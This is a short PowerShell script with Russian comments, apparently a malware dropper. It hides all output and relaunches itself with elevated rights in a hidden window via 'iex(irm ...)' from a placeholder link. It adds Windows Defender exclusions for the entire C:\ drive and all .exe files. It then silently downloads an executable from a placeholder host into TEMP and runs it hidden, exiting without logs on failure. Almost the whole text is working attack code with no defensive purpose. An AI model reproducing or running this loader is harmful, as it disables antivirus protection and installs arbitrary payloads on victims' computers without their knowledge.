# глушим все стандартные выводы и ошибки
$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

# 1. проверка на админа и тихий перезапуск
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    # -WindowStyle Hidden скроет окно новой сессии
    start-process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"iex(irm 'мояссылка.com')`"" -Verb RunAs
    exit
}

# 2. добавление исключений (вывод в $null чтобы reg add не писал "The operation completed successfully")
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\" /t REG_SZ /d 0 /f > $null 2>&1
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions" /v "exe" /t REG_SZ /d 0 /f > $null 2>&1

# 3. тихая скачка и запуск
$url = "http://твой-ресурс.com/file.exe"
$out = "$env:TEMP\file.exe"

try {
    # используем curl (alias для iwr) с параметрами тишины
    curl -Uri $url -OutFile $out -ErrorAction SilentlyContinue
    if (Test-Path $out) {
        # запускаем без создания нового окна консоли
        Start-Process -FilePath $out -WindowStyle Hidden
    }
} catch {
    # просто выходим без логов
    exit
}
